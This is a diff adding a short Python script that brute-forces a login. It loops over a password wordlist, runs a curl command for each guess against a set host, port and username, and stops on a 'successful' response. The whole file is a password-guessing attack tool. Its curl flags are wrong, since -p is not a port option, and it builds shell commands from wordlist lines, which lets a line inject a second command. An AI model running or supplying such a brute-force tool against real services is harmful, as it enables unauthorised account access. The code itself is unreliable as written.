@@ -1,0 +1,20 @@
+import subprocess
+
+url = "https://123.com"
+port = "2121"
+username = "user"
+wordlist_path = "path/to/your/wordlist.txt"
+
+with open(wordlist_path, 'r') as wordlist_file:
+    for password in wordlist_file:
+        password = password.strip()  # Remove newline characters
+        
+        # Construct the curl command
+        curl_command = f"curl -s {url} -p {port} -u {username}:{password}"
+        
+        # Run the curl command and capture the output
+        result = subprocess.run(curl_command, shell=True, capture_output=True, text=True)
+        
+        if "successful" in result.stdout:  # You might need to adjust this condition based on the actual response
+            print(f"Correct password found: {password}")
+            break
